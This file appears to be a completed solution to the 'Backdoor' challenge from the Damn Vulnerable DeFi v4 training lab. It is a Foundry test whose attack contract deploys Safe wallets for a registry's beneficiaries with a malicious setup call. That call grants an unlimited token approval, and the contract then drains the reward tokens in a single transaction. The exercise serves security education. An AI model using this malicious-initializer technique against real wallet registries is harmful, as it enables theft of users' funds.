// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorAttack {
    Safe immutable singletonCopy;
    SafeProxyFactory immutable walletFactory;
    DamnValuableToken immutable token;
    WalletRegistry immutable walletRegistry;
    address[] public users;
    address immutable recoveryAddress;

    constructor(
        address _singletonCopy,
        address _walletFactory,
        address _token,
        address _walletRegistry,
        address[] memory _users,
        address _recoveryAddress
    ) {
        singletonCopy = Safe(payable(_singletonCopy));
        walletFactory = SafeProxyFactory(_walletFactory);
        token = DamnValuableToken(_token);
        walletRegistry = WalletRegistry(_walletRegistry);
        users = _users;
        recoveryAddress = _recoveryAddress;
    }

    function attack() external {
        for (uint256 i = 0; i < users.length; i++) {
            address beneficiary = users[i];

            // Create Safe wallet for the beneficiary with malicious setup
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;

            bytes memory maliciousCalldata =
                abi.encodeWithSelector(this.approveToken.selector, address(token), address(this), type(uint256).max);

            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                1, // threshold
                address(this), // to
                maliciousCalldata, // data
                address(0), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                payable(address(0)) // paymentReceiver
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy), initializer, uint256(uint160(beneficiary)), walletRegistry
            );

            // Transfer tokens from the Safe to the recovery address
            uint256 safeBalance = token.balanceOf(address(proxy));
            token.transferFrom(address(proxy), recoveryAddress, safeBalance);
        }
    }

    function approveToken(address _token, address spender, uint256 amount) external {
        DamnValuableToken(_token).approve(spender, amount);
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        BackdoorAttack attackContract = new BackdoorAttack(
            address(singletonCopy), address(walletFactory), address(token), address(walletRegistry), users, recovery
        );

        attackContract.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
